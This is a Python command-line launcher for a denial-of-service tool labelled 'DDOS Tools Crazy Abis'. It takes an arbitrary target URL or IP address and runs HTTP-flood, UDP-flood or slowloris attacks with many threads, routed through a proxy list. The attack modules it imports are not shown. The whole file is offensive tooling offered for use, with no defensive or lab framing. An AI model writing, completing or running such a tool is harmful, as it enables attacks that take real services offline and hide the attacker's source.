import argparse
from core.attack import DDOSAttack
from core.proxy_manager import ProxyManager
from core.utils import validate_target, is_valid_url
from config import Config

def main():
    parser = argparse.ArgumentParser(description="DDOS Tools Crazy Abis")
    parser.add_argument("-t", "--target", required=True, help="Target URL or IP Address")
    parser.add_argument("-a", "--attack_type", required=True, choices=['http', 'udp', 'slowloris'], help="Attack type (http, udp, slowloris)")
    parser.add_argument("-n", "--num_threads", type=int, default=100, help="Number of threads (default: 100)")
    parser.add_argument("-p", "--proxy_file", default="proxies.txt", help="Proxy list file (default: proxies.txt)")
    args = parser.parse_args()

    if not is_valid_url(args.target) and not validate_target(args.target):
        print("Invalid target. Please enter a valid URL or IP address.")
        return

    proxy_manager = ProxyManager(args.proxy_file)
    ddos = DDOSAttack(args.target, args.attack_type, args.num_threads, proxy_manager)
    ddos.run()

if __name__ == "__main__":
    main()
